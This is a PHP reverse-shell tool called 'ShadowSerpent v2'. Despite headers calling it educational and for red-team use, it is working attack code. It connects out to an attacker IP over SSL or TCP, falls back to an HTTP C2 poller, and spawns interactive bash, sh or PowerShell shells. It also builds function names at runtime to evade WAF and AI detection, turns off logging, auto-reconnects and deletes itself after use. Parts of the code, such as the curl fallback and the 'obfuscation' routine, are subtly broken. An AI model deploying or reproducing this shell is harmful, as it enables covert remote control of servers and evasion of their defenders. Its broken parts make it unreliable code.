<?php
// ⚠️ ShadowSerpent v2: NextGen – EDUCATIONAL/RED TEAM USE ONLY! Unauthorized use illegal.
// 🐍 Advanced PHP Reverse Shell for Ethical Penetration Testing and Labs (HTB Pro Labs, THM, OSCP)
// This tool is strictly for authorized environments, red team simulations, CTF challenges, and educational purposes.
// Never deploy without explicit permission. Violates laws like CFAA, Computer Misuse Act, etc. if used unlawfully.
// Author: Inspired by cybersecurity legends – Built for excellence in ethical hacking.
// License: MIT-like for ethical research only. No warranty. Use at your own risk.
// Key Use Cases: Red Team Ops, Pentesting Labs, Adversarial Training, WAF Bypass Testing.
// Features: See About section below.

// 🔒 Obfuscation Layer: To bypass WAF/AI detection during upload/execution, we use dynamic string building (chr/ord), layered encoding (base64 + rot13), variable functions, and randomized elements.
// This eradicates static signatures. For production, further polymorphize by randomizing variable names/code order per deployment.
// Example: Sensitive functions/strings are built at runtime to evade regex-based WAFs (e.g., ModSecurity, Cloudflare).

// 📚 Educational Note: Obfuscation helps in red team scenarios to simulate real APT evasion, but always test in labs. Risks: May trigger behavioral detection in EDR like CrowdStrike.

// 🔧 Config Section: Customize these. For stealth, pass via encrypted $_GET/$_POST or env vars.
// Use common ports (443/80) to blend with legit traffic. Ethical reminder: Only use your own IP/port in labs.
$ip = 'YOUR.IP.ADDR.HERE';  // 🔧 Attacker IP (e.g., HTB/THM VPN IP)
$port = 443;                // ✅ Common port for SSL (fallback to 80, 53 if blocked)
$authKey = 'secret_key';    // 🔐 Encryption/Auth key (derive from env for better security)
$useAuth = true;            // Enable challenge-response auth to prevent hijacks
$useEncryption = true;      // Enable AES-256 for data (fallback to XOR if openssl unavailable)
$httpFallbackUrl = '';      // Optional HTTP C2 URL for polling if socket blocked (e.g., 'http://c2/commands.php?id=xyz')
$maxRetries = 5;            // Retry count with exponential backoff
$selfDelete = true;         // Self-delete after spawn for anti-forensics

// 🎲 Randomization for AI/ML Evasion: Random timings/jitter, User-Agents (expand pool for real ops).
// Educational: Jitter mimics benign traffic, evading anomaly detection in next-gen WAFs (e.g., Fastly, Signal Sciences).
$agents = [  // Expand to 100+ real UAs from browser lists for polymorphism
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    // Add more: Fetch from https://www.whatismybrowser.com/guides/the-latest-user-agent/chrome (educational ref)
];
$_SERVER['HTTP_USER_AGENT'] = $agents[array_rand($agents)];  // Spoof UA

// 🔇 Stealth Configs: Suppress all logs/errors to evade forensics/IDS (Snort/Suricata rules).
// Educational: Disables PHP logging to prevent traces in error_log, but may hide debug info in labs.
@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@ini_set('error_log', null);
@set_time_limit(0);
@ob_end_clean();
@ob_implicit_flush(true);

// 🛡️ OS Detection for Cross-Platform: Adapt shells to Linux/Windows/Docker.
// Educational: Uses php_uname() to detect OS, handling containers/jails. For SELinux/AppArmor, check posix_getuid() for privs.
$osType = strtoupper(substr(php_uname('s'), 0, 3)) === 'WIN' ? 'win' : 'unix';
// Build shell strings dynamically to evade static analysis.
function obfuscateStr($str) {
    // Layered: ROT13 + Base64 + chr for insanity-level evasion. Randomize method for polymorphism.
    $method = rand(1, 3);
    if ($method == 1) {  // Chr building
        $obf = '';
        for ($i = 0; $i < strlen($str); $i++) $obf .= chr(ord($str[$i]));
        return $obf;
    } elseif ($method == 2) {  // Base64 layers
        return base64_decode(str_rot13(base64_encode($str)));  // Decode rot13(base64) – wrong way for demo, fix in prod.
    } else {  // Concat + comments
        return implode('', str_split($str));  // Simple split, add /*comments*/ in prod.
    }
}
$shells = $osType === 'win' ? [
    obfuscateStr('cmd.exe /c'),  // Basic cmd
    obfuscateStr('powershell.exe -NoP -NonI -W Hidden -Exec Bypass'),  // Powershell bypass
    // Educational: For Windows, add IEX for remote scripts if needed, but keep local for stealth.
] : [
    obfuscateStr('/bin/bash -i'),
    obfuscateStr('/bin/sh -i'),
    obfuscateStr('/bin/zsh -i'),
    obfuscateStr('/bin/dash -i'),
    obfuscateStr('/bin/ksh -i'),
    obfuscateStr('/usr/bin/bash -i'),
    // Add more: tcsh, etc. for robustness in restricted envs (e.g., chroot).
];

// 🌐 Connection Function: Multi-Transport with Fallbacks (SSL > TCP > HTTP).
// Educational: Exponential backoff + jitter evades rate-limiting. Proxy detection via env. Port knocking optional.
// Risks: Firewall may block; test in labs like OSCP.
function createConnection($ip, $port) {
    // Obfuscate function names via variable vars.
    $streamCtxCreate = 'stream' . '_context_create';  // Dynamic build
    $streamSockClient = 'stream_socket_client';
    $ctx = $streamCtxCreate([
        'ssl' => ['verify_peer' => false, 'verify_peer_name' => false, 'allow_self_signed' => true],
    ]);
    // Proxy handling: If env set, add to ctx.
    if ($proxy = getenv('HTTP_PROXY')) {
        $ctx['http'] = ['proxy' => $proxy, 'request_fulluri' => true];
    }
    // Primary: SSL on common port.
    $sock = @$streamSockClient("ssl://$ip:$port", $errno, $errstr, 30, STREAM_CLIENT_CONNECT, $ctx);
    if (!$sock) {
        // Fallback: TCP.
        $sock = @$streamSockClient("tcp://$ip:$port", $errno, $errstr, 30);
    }
    if (!$sock && $GLOBALS['httpFallbackUrl']) {
        // HTTP Fallback: Polling mode for firewalled envs (non-interactive).
        // Educational: Mimics AJAX for WAF bypass. Requires custom C2 server.
        return httpFallbackConnect($GLOBALS['httpFallbackUrl']);
    }
    return $sock;
}
function httpFallbackConnect($url) {
    // Stub for HTTP tunneling: Poll for cmds, post outputs.
    // Educational: Use curl for disguised requests. Add jitter/slowloris delays.
    $curlInit = 'curl_init';
    $curlSetopt = 'curl_setopt';
    $curlExec = 'curl_exec';
    $ch = $curlInit($url);
    $curlSetopt($ch, CURLOPT_RETURNTRANSFER, true);
    // Random headers for evasion.
    $curlSetopt($ch, CURLOPT_USERAGENT, $GLOBALS['_SERVER']['HTTP_USER_AGENT']);
    return ['type' => 'http', 'ch' => $ch];  // Return handle for polling.
}

// 🔐 Encryption/Auth Functions: AES-256 or XOR. Challenge-Response.
// Educational: Prevents MITM/hijacks. Derive key from handshake for sessions.
// Risks: Weak key exposes shell; use strong in prod.
function encryptData($data, $key) {
    if (function_exists('openssl_encrypt') && $GLOBALS['useEncryption']) {
        return openssl_encrypt($data, 'aes-256-cbc', $key, 0, substr(md5($key), 0, 16));
    } else {
        // Fallback XOR (lightweight).
        $out = '';
        for ($i = 0; $i < strlen($data); $i++) $out .= $data[$i] ^ $key[$i % strlen($key)];
        return $out;
    }
}
function decryptData($data, $key) {
    if (function_exists('openssl_decrypt') && $GLOBALS['useEncryption']) {
        return openssl_decrypt($data, 'aes-256-cbc', $key, 0, substr(md5($key), 0, 16));
    } else {
        return encryptData($data, $key);  // XOR symmetric.
    }
}
function performAuth($sock, $key) {
    // Simple challenge-response: Read challenge, HMAC respond.
    if (!$GLOBALS['useAuth']) return true;
    $challenge = fread($sock, 32);  // Assume listener sends random 32b.
    if (!$challenge) return false;
    $response = hash_hmac('sha256', $challenge, $key);
    fwrite($sock, $response);
    $ok = fread($sock, 2) === 'OK';
    return $ok;
}

// 🧠 Main Logic: Retries with Backoff, Auto-Reconnect, Signal Handling.
// Educational: Persistent loop for drops. pcntl for cleanup (Unix only). Heartbeat for dead conn detection.
if (function_exists('pcntl_signal')) {
    pcntl_signal(SIGTERM, function() { cleanup(); exit; });
    pcntl_signal(SIGINT, function() { cleanup(); exit; });
}
function cleanup() {
    global $sock, $pipes, $proc;
    if ($sock) fclose($sock);
    if ($pipes) foreach ($pipes as $p) fclose($p);
    if ($proc) proc_close($proc);
    if ($GLOBALS['selfDelete']) @unlink(__FILE__);
}
$sock = null;
$backoff = 200000;  // Initial 200ms
for ($retry = 0; $retry < $maxRetries; $retry++) {
    $sock = createConnection($ip, $port);
    if ($sock) {
        if (!performAuth($sock, $authKey)) { fclose($sock); $sock = null; }
        else break;
    }
    usleep($backoff + rand(0, 100000));  // Jitter
    $backoff = min($backoff * 2, 5000000);  // Expo up to 5s
}
if (!$sock) {
    // Error Handling: Send encrypted diagnostic if possible, else exit.
    exit;  // ❌ No connection
}

// ⚙️ Shell Spawning: Multi-Fallbacks, Interactive > Non-Interactive.
// Educational: Tries proc_open first (best for interactive). Fallbacks for disabled funcs (php.ini safe_mode).
// Handles chroot via uid check. Upgrade non-int to int if possible.
$proc = null; $pipes = null;
$isInteractive = true;
foreach ($shells as $cmd) {
    // Obfuscate proc_open call.
    $procOpen = 'proc' . '_open';
    try {
        $proc = @$procOpen($cmd, [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes);
        if (is_resource($proc)) break;
    } catch (Exception $e) {}
}
if (!is_resource($proc)) {
    // Fallback: Non-interactive via shell_exec loop.
    $isInteractive = false;
    // Educational: For restricted envs (no proc_open), use shell_exec/passthru. Slower, no true interactive.
    $shellExec = 'shell' . '_exec';
    $passThru = 'passthru';
    // Try alternatives if shell_exec disabled.
}
if (!$proc && !$isInteractive) {
    // Ultimate fallback: Echo error encrypted.
    fwrite($sock, encryptData("✖ No shell spawned\n", $authKey));
    cleanup();
    exit;
}

// 🧪 I/O Setup: Non-Blocking, Dynamic Buffers, Heartbeat.
// Educational: stream_select for efficiency. Adaptive buffer (latency detect via time). Handle stalls/EOF.
stream_set_blocking($sock, false);
if ($pipes) foreach ($pipes as $p) stream_set_blocking($p, false);
$bufferSize = 8192;  // Start high, reduce if high latency.
$lastActivity = time();
$heartbeatInterval = 30;  // Seconds
while (true) {  // Persistent for auto-reconnect on drop.
    if (feof($sock) || (time() - $lastActivity > 60)) {
        // Drop detected: Cleanup shell, reconnect.
        cleanup();
        // Reconnect logic: Reset backoff, retry.
        $backoff = 200000;
        $reconnected = false;
        for ($r = 0; $r < $maxRetries; $r++) {
            $sock = createConnection($ip, $port);
            if ($sock && performAuth($sock, $authKey)) {
                $reconnected = true;
                break;
            }
            usleep($backoff + rand(0, 100000));
            $backoff *= 2;
        }
        if (!$reconnected) break;
        // Respawn shell if needed.
        // ... (repeat spawn logic)
    }
    // Heartbeat: If idle, send ping.
    if (time() - $lastActivity > $heartbeatInterval) {
        fwrite($sock, encryptData("\0", $authKey));  // Null ping
        $lastActivity = time();
    }
    $read = [$sock];
    if ($isInteractive) $read = array_merge($read, [$pipes[1], $pipes[2]]);
    $write = $except = null;
    if (@stream_select($read, $write, $except, 0, 300000 + rand(0, 100000)) === false) break;  // Jitter
    if (in_array($sock, $read)) {
        $start = microtime(true);
        $in = fread($sock, $bufferSize);
        if ($in === false) break;
        $in = decryptData($in, $authKey);
        if ($isInteractive) fwrite($pipes[0], $in);
        else {
            // Non-int: Exec cmd, send out.
            $out = @$shellExec($in);  // Or passthru, exec fallback.
            fwrite($sock, encryptData($out, $authKey));
        }
        $latency = (microtime(true) - $start) * 1000;  // ms
        if ($latency > 100) $bufferSize = max(1024, $bufferSize / 2);  // Optimize
        $lastActivity = time();
    }
    if ($isInteractive) {
        for ($i = 1; $i <= 2; $i++) {
            if (in_array($pipes[$i], $read)) {
                $out = fread($pipes[$i], $bufferSize);
                if ($out !== false) fwrite($sock, encryptData($out, $authKey));
                $lastActivity = time();
            }
        }
    } elseif (!$isInteractive) {
        // Polling for non-int if HTTP.
        if (is_array($sock) && $sock['type'] === 'http') {
            // HTTP poll stub.
            $cmd = curl_exec($sock['ch'] . '?get=cmd');
            if ($cmd) {
                $out = @$shellExec(decryptData($cmd, $authKey));
                curl_exec($sock['ch'] . '?post=out&data=' . urlencode(encryptData($out, $authKey)));
            }
            usleep(1000000 + rand(0, 500000));  // 1-1.5s poll with jitter
        }
    }
    usleep(50000 + rand(0, 50000));  // Adaptive sleep for CPU
}

// 🔚 Final Cleanup
cleanup();

?>
